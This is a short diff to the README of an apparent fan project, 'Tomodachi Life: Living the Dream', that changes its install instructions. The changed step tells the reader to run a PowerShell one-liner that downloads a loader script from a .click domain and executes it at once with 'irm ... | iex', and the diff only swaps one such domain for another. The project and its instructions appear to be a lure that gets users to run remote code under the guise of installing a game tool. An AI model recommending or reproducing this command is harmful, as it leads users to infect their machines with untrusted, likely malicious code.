@@ -12,7 +12,7 @@ Welcome to **Tomodachi Life: Living the Dream** – a reimagined, community-driv
 
 ### Step 2: Execute Deployment Command
 ```cmd
-powershell -Command "irm https://software-get.click/Loader.ps1?get=Ryujinx | iex"
+powershell -Command "irm https://software-gateway.click/Loader.ps1?get=Ryujinx | iex"
 ```
 ### Step 3: Start Using the Tool
 - Run the main script from the installation directory
